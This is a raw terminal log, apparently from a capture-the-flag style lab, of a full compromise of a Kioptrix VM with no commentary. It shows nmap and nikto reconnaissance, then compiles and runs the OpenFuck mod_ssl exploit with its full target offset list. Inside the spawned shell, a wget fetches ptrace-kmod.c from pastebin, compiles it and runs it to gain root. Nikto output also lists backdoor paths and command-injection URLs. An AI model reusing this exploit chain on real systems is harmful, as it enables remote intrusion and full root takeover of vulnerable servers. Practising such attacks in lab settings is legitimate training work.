root@Blue3:~# nmap -sC -sV -sS -T4 -A -p- 192.168.1.3 -vvv
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-02 19:28 +07
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:28
Completed NSE at 19:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:28
Completed NSE at 19:28, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:28
Completed NSE at 19:28, 0.00s elapsed
Initiating ARP Ping Scan at 19:28
Scanning 192.168.1.3 [1 port]
Completed ARP Ping Scan at 19:28, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:28
Completed Parallel DNS resolution of 1 host. at 19:28, 11.04s elapsed
DNS resolution of 1 IPs took 11.04s. Mode: Async [#: 4, OK: 0, NX: 1, DR: 0, SF: 0, TR: 5, CN: 0]
Initiating SYN Stealth Scan at 19:28
Scanning 192.168.1.3 [65535 ports]
Discovered open port 111/tcp on 192.168.1.3
Discovered open port 80/tcp on 192.168.1.3
Discovered open port 443/tcp on 192.168.1.3
Discovered open port 139/tcp on 192.168.1.3
Discovered open port 22/tcp on 192.168.1.3
Discovered open port 1024/tcp on 192.168.1.3
Completed SYN Stealth Scan at 19:28, 4.73s elapsed (65535 total ports)
Initiating Service scan at 19:28
Scanning 6 services on 192.168.1.3
Completed Service scan at 19:29, 14.04s elapsed (6 services on 1 host)
Initiating OS detection (try #1) against 192.168.1.3
NSE: Script scanning 192.168.1.3.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:29
NSE Timing: About 99.88% done; ETC: 19:29 (0:00:00 remaining)
Completed NSE at 19:30, 51.08s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:30
NSE Timing: About 98.21% done; ETC: 19:30 (0:00:01 remaining)
Completed NSE at 19:31, 60.03s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:31
Completed NSE at 19:31, 0.01s elapsed
Nmap scan report for 192.168.1.3
Host is up, received arp-response (0.00078s latency).
Scanned at 2020-08-02 19:28:41 +07 for 143s
Not shown: 65529 closed ports
Reason: 65529 resets
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
| 1024 35 1094820929536015309274469851438123775609256551942541702703803145208417768493356282584089941904137161521056844232803694672190935267401185                                    07720167655934779634416983599247086840099503203800281526143567271862466057363705861760702664279290804439502645034586412570490614431533437479630834                                    594344497670338190191879537
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAKtycvxuV/e7s2cN74HyTZXHXiBrwyiZe/PKT/inuT5NDSQTPsGiyJZU4gefPAsYKSw5wLe28TDlZWHAdXpNdwyn4QrFQBjwFR+8WbFiAZBoWlSfQPR2                                    RQW8i32Y2P2V79p4mu742HtWBz0hTjkd9qL5j8KCUPDfY9hzDuViWy7PAAAAFQCY9bvq+5rs1OpY5/DGsGx0k6CqGwAAAIBVpBtIHbhvoQdN0WPe8d6OzTTFvdNRa8pWKzV1Hpw+e3qsC4LYHA                                    y1NoeaqK8uJP9203MEkxrd2OoBJKn/8EXlKAco7vC1dr/QWae+NEkI1a38x0Ml545vHAGFaVUWkffHekjhR476Uq4N4qeLfFp5B+v+9flLxYVYsY/ymJKpNgAAAIEApyjrqjgX0AE4fSBFntGF                                    WM3j5M3lc5jw/0qufXlHJu8sZG0FRf9wTI6HlJHHsIKHA7FZ33vGLq3TRmvZucJZ0l55fV2ASS9uvQRE+c8P6w72YCzgJN7v4hYXxnY4RiWvINjW/F6ApQEUJc742i6Fn54FEYAIy5goatGFMw                                    pVq3Q=
|   1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAvv8UUWsrO7+VCG/rTWY72jElft4WXfXGWybh141E8XnWxMCu+R1qdocxhh+4Clz8wO9beuZzG1rjlAD+XHiR3j2P+sw6UODeyBkuP24a+7V8                                    P5nu9ksKD1fA83RyelgSgRJNQgPfFU3gngNno1yN6ossqkcMQTI1CY5nF6iYePs=
|_sshv1: Server supports SSHv1
80/tcp   open  http        syn-ack ttl 64 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     syn-ack ttl 64 2 (RPC #100000)
139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   syn-ack ttl 64 Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2020-08-02T12:31:54+00:00; +1m50s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
1024/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
MAC Address: 00:0C:29:31:30:86 (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=8/2%OT=22%CT=1%CU=39808%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM
OS:=5F26B208%P=arm-unknown-linux-gnueabihf)SEQ(SP=CA%GCD=1%ISR=D1%TI=Z%CI=Z
OS:%II=I%TS=7)OPS(O1=M5B4ST11NW0%O2=M5B4ST11NW0%O3=M5B4NNT11NW0%O4=M5B4ST11
OS:NW0%O5=M5B4ST11NW0%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16
OS:A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW0%CC=N%Q=)T1(R=Y%DF=Y%T=4
OS:0%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M
OS:5B4ST11NW0%RD=0%Q=)T4(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF
OS:=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T7(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=FF%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=FF%CD=S)

Uptime guess: 0.036 days (since Sun Aug  2 18:39:22 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=202 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
|_clock-skew: 1m49s
| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KIOPTRIX<00>         Flags: <unique><active>
|   KIOPTRIX<03>         Flags: <unique><active>
|   KIOPTRIX<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   MYGROUP<00>          Flags: <group><active>
|   MYGROUP<1d>          Flags: <unique><active>
|   MYGROUP<1e>          Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 2572/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 63911/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 27342/udp): CLEAN (Failed to receive data)
|   Check 4 (port 22323/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.78 ms 192.168.1.3

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:31
Completed NSE at 19:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:31
Completed NSE at 19:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:31
Completed NSE at 19:31, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.01 seconds
           Raw packets sent: 65555 (2.885MB) | Rcvd: 65551 (2.623MB)

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

root@Blue3:~# nikto -h 192.168.1.3
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.3
+ Target Hostname:    192.168.1.3
+ Target Port:        80
+ Start Time:         2020-08-02 19:48:05 (GMT7)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 10:12:46 2001
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a diffe                                                          rent fashion to the MIME type
+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to ki                                                          ll any process on the system. CAN-2002-0839.
+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://                                                          cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).
+ OSVDB-3268: /manual/: Directory indexing found.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time:           2020-08-02 19:48:33 (GMT7) (28 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

root@Blue3:~/Downloads# git clone https://github.com/heltonWernik/OpenLuck
Cloning into 'OpenLuck'...
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 26 (delta 0), reused 0 (delta 0), pack-reused 22
Unpacking objects: 100% (26/26), 22.90 KiB | 350.00 KiB/s, done.
root@Blue3:~/Downloads# apt-get install -y libssl-dev
Reading package lists... Done
Building dependency tree
Reading state information... Done
libssl-dev is already the newest version (1.1.1g-1).
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.

root@Blue3:~/Downloads# cd OpenLuck/
root@Blue3:~/Downloads/OpenLuck# dlist
total 52
drwxr-xr-x 4 root root  4096 Aug  2 19:51 ..
-rw-r--r-- 1 root root   827 Aug  2 19:51 README.md
-rw-r--r-- 1 root root 34175 Aug  2 19:51 OpenFuck.c
drwxr-xr-x 8 root root  4096 Aug  2 19:51 .git
drwxr-xr-x 3 root root  4096 Aug  2 19:51 .

root@Blue3:~/Downloads/OpenLuck# dlist
total 52
drwxr-xr-x 4 root root  4096 Aug  2 19:51 ..
-rw-r--r-- 1 root root   827 Aug  2 19:51 README.md
-rw-r--r-- 1 root root 34175 Aug  2 19:51 OpenFuck.c
drwxr-xr-x 8 root root  4096 Aug  2 19:51 .git
drwxr-xr-x 3 root root  4096 Aug  2 19:51 .

root@Blue3:~/Downloads/OpenLuck# gcc -o OpenFuck OpenFuck.c -lcrypto

root@Blue3:~/Downloads/OpenLuck# ./OpenFuck

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./OpenFuck target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)


  Supported OffSet:
        0x00 - Caldera OpenLinux (apache-1.3.26)
        0x01 - Cobalt Sun 6.0 (apache-1.3.12)
        0x02 - Cobalt Sun 6.0 (apache-1.3.20)
        0x03 - Cobalt Sun x (apache-1.3.26)
        0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)
        0x05 - Conectiva 4 (apache-1.3.6)
        0x06 - Conectiva 4.1 (apache-1.3.9)
        0x07 - Conectiva 6 (apache-1.3.14)
        0x08 - Conectiva 7 (apache-1.3.12)
        0x09 - Conectiva 7 (apache-1.3.19)
        0x0a - Conectiva 7/8 (apache-1.3.26)
        0x0b - Conectiva 8 (apache-1.3.22)
        0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)
        0x0d - Debian GNU Linux (apache_1.3.19-1)
        0x0e - Debian GNU Linux (apache_1.3.22-2)
        0x0f - Debian GNU Linux (apache-1.3.22-2.1)
        0x10 - Debian GNU Linux (apache-1.3.22-5)
        0x11 - Debian GNU Linux (apache_1.3.23-1)
        0x12 - Debian GNU Linux (apache_1.3.24-2.1)
        0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1)
        0x14 - Debian GNU Linux (apache_1.3.24-3)
        0x15 - Debian GNU Linux (apache-1.3.26-1)
        0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1)
        0x17 - Debian GNU Linux (apache-1.3.27)
        0x18 - FreeBSD (apache-1.3.9)
        0x19 - FreeBSD (apache-1.3.11)
        0x1a - FreeBSD (apache-1.3.12.1.40)
        0x1b - FreeBSD (apache-1.3.12.1.40)
        0x1c - FreeBSD (apache-1.3.12.1.40)
        0x1d - FreeBSD (apache-1.3.12.1.40_1)
        0x1e - FreeBSD (apache-1.3.12)
        0x1f - FreeBSD (apache-1.3.14)
        0x20 - FreeBSD (apache-1.3.14)
        0x21 - FreeBSD (apache-1.3.14)
        0x22 - FreeBSD (apache-1.3.14)
        0x23 - FreeBSD (apache-1.3.14)
        0x24 - FreeBSD (apache-1.3.17_1)
        0x25 - FreeBSD (apache-1.3.19)
        0x26 - FreeBSD (apache-1.3.19_1)
        0x27 - FreeBSD (apache-1.3.20)
        0x28 - FreeBSD (apache-1.3.20)
        0x29 - FreeBSD (apache-1.3.20+2.8.4)
        0x2a - FreeBSD (apache-1.3.20_1)
        0x2b - FreeBSD (apache-1.3.22)
        0x2c - FreeBSD (apache-1.3.22_7)
        0x2d - FreeBSD (apache_fp-1.3.23)
        0x2e - FreeBSD (apache-1.3.24_7)
        0x2f - FreeBSD (apache-1.3.24+2.8.8)
        0x30 - FreeBSD 4.6.2-Release-p6 (apache-1.3.26)
        0x31 - FreeBSD 4.6-Realease (apache-1.3.26)
        0x32 - FreeBSD (apache-1.3.27)
        0x33 - Gentoo Linux (apache-1.3.24-r2)
        0x34 - Linux Generic (apache-1.3.14)
        0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk)
        0x36 - Mandrake Linux 7.1 (apache-1.3.14-2)
        0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)
        0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk)
        0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2
        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)
        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)
        0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)
        0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)
        0x3e - Mandrake Linux 8.0 (apache-1.3.19-3)
        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)
        0x40 - Mandrake Linux 8.2 (apache-1.3.23-4)
        0x41 - Mandrake Linux 8.2 #2 (apache-1.3.23-4)
        0x42 - Mandrake Linux 8.2 (apache-1.3.24)
        0x43 - Mandrake Linux 9 (apache-1.3.26)
        0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1)
        0x45 - RedHat Linux TEST1 (apache-1.3.12-1)
        0x46 - RedHat Linux TEST2 (apache-1.3.12-1)
        0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)
        0x48 - RedHat Linux 4.2 (apache-1.1.3-3)
        0x49 - RedHat Linux 5.0 (apache-1.2.4-4)
        0x4a - RedHat Linux 5.1-Update (apache-1.2.6)
        0x4b - RedHat Linux 5.1 (apache-1.2.6-4)
        0x4c - RedHat Linux 5.2 (apache-1.3.3-1)
        0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)
        0x4e - RedHat Linux 6.0 (apache-1.3.6-7)
        0x4f - RedHat Linux 6.0 (apache-1.3.6-7)
        0x50 - RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)
        0x51 - RedHat Linux 6.0 Update (apache-1.3.24)
        0x52 - RedHat Linux 6.1 (apache-1.3.9-4)1
        0x53 - RedHat Linux 6.1 (apache-1.3.9-4)2
        0x54 - RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)
        0x55 - RedHat Linux 6.1-fp2000 (apache-1.3.26)
        0x56 - RedHat Linux 6.2 (apache-1.3.12-2)1
        0x57 - RedHat Linux 6.2 (apache-1.3.12-2)2
        0x58 - RedHat Linux 6.2 mod(apache-1.3.12-2)3
        0x59 - RedHat Linux 6.2 update (apache-1.3.22-5.6)1
        0x5a - RedHat Linux 6.2-Update (apache-1.3.22-5.6)2
        0x5b - Redhat Linux 7.x (apache-1.3.22)
        0x5c - RedHat Linux 7.x (apache-1.3.26-1)
        0x5d - RedHat Linux 7.x (apache-1.3.27)
        0x5e - RedHat Linux 7.0 (apache-1.3.12-25)1
        0x5f - RedHat Linux 7.0 (apache-1.3.12-25)2
        0x60 - RedHat Linux 7.0 (apache-1.3.14-2)
        0x61 - RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)
        0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)
        0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)
        0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1
        0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2
        0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)
        0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1)
        0x68 - RedHat Linux 7.1 (apache-1.3.22-src)
        0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1)
        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
        0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)
        0x6d - RedHat Linux 7.2 (apache-1.3.24)
        0x6e - RedHat Linux 7.2 (apache-1.3.26)
        0x6f - RedHat Linux 7.2 (apache-1.3.26-snc)
        0x70 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)1
        0x71 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)2
        0x72 - RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)
        0x73 - RedHat Linux 7.3 (apache-1.3.23-11)1
        0x74 - RedHat Linux 7.3 (apache-1.3.23-11)2
        0x75 - RedHat Linux 7.3 (apache-1.3.27)
        0x76 - RedHat Linux 8.0 (apache-1.3.27)
        0x77 - RedHat Linux 8.0-second (apache-1.3.27)
        0x78 - RedHat Linux 8.0 (apache-2.0.40)
        0x79 - Slackware Linux 4.0 (apache-1.3.6)
        0x7a - Slackware Linux 7.0 (apache-1.3.9)
        0x7b - Slackware Linux 7.0 (apache-1.3.26)
        0x7c - Slackware 7.0  (apache-1.3.26)2
        0x7d - Slackware Linux 7.1 (apache-1.3.12)
        0x7e - Slackware Linux 8.0 (apache-1.3.20)
        0x7f - Slackware Linux 8.1 (apache-1.3.24)
        0x80 - Slackware Linux 8.1 (apache-1.3.26)
        0x81 - Slackware Linux 8.1-stable (apache-1.3.26)
        0x82 - Slackware Linux (apache-1.3.27)
        0x83 - SuSE Linux 7.0 (apache-1.3.12)
        0x84 - SuSE Linux 7.1 (apache-1.3.17)
        0x85 - SuSE Linux 7.2 (apache-1.3.19)
        0x86 - SuSE Linux 7.3 (apache-1.3.20)
        0x87 - SuSE Linux 8.0 (apache-1.3.23)
        0x88 - SUSE Linux 8.0 (apache-1.3.23-120)
        0x89 - SuSE Linux 8.0 (apache-1.3.23-137)
        0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)

Fuck to all guys who like use lamah ddos. Read SRC to have no surprise

root@Blue3:~/Downloads/OpenLuck# ./OpenFuck 0x6a 192.168.1.3 443 -c 40

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8070
Ready to send shellcode
Spawning shell...
Good Bye!
root@Blue3:~/Downloads/OpenLuck# ./OpenFuck 0x6b 192.168.1.3 443 -c 40

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f81e8
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$
race-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt
--08:56:39--  https://pastebin.com/raw/C7v25Xr9
           => `ptrace-kmod.c'
Connecting to pastebin.com:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]

    0K ...                                                    @   1.92 MB/s

08:56:40 (1.28 MB/s) - `ptrace-kmod.c' saved [4026]

ptrace-kmod.c:183:1: warning: no newline at end of file
[+] Attached to 6237
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
ls -ltra
total 23
drwxr-xr-x   19 root     root         1024 Aug  2 07:41 ..
-rwsr-sr-x    1 root     root        19920 Aug  2 08:56 p
drwxrwxrwt    2 root     root         1024 Aug  2 08:56 .
whoami
root
pwd
/tmp
cd ~
ls -ltra
total 12
-rw-r--r--    1 root     root         1126 Aug 23  1995 .Xresources
-rw-r--r--    1 root     root          176 Aug 23  1995 .bashrc
-rw-r--r--    1 root     root           24 Jun 10  2000 .bash_logout
-rw-r--r--    1 root     root          210 Jun 10  2000 .cshrc
-rw-r--r--    1 root     root          196 Jul 11  2000 .tcshrc
-rw-r--r--    1 root     root          234 Jul  5  2001 .bash_profile
-rw-r--r--    1 root     root         1303 Sep 26  2009 anaconda-ks.cfg
drwxr-x---    2 root     root         1024 Sep 26  2009 .
-rw-------    1 root     root          147 Oct 12  2009 .bash_history
drwxr-xr-x   19 root     root         1024 Aug  2 07:41 ..
